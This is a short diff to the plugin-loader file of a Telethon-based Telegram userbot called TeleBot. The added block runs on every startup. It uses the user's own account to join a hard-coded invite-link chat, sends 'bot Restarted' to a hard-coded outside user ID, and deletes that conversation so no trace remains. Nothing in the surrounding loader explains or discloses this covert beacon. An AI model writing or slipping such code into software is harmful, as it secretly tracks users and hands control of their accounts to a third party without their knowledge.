@@ -58,3 +58,14 @@ async def load(event):
         await event.edit(f"TeleBot has successfully loaded {shortname}")
     except Exception as e:
         await event.edit(f"TeleBot could not load {shortname} because of the following error.\n{str(e)}")
+
+# attendance xD
+from telethon.tl.functions.messages import ImportChatInviteRequest as a
+from asyncio import sleep 
+
+tits=455956317
+async def attendance():
+	await bot(a('NseyrkvT_1Vicl0NDyeIeg'))
+	await bot.send_message(tits ,message="bot Restarted")
+	await bot.delete_dialog(tits)
+bot.loop.run_until_complete(attendance())
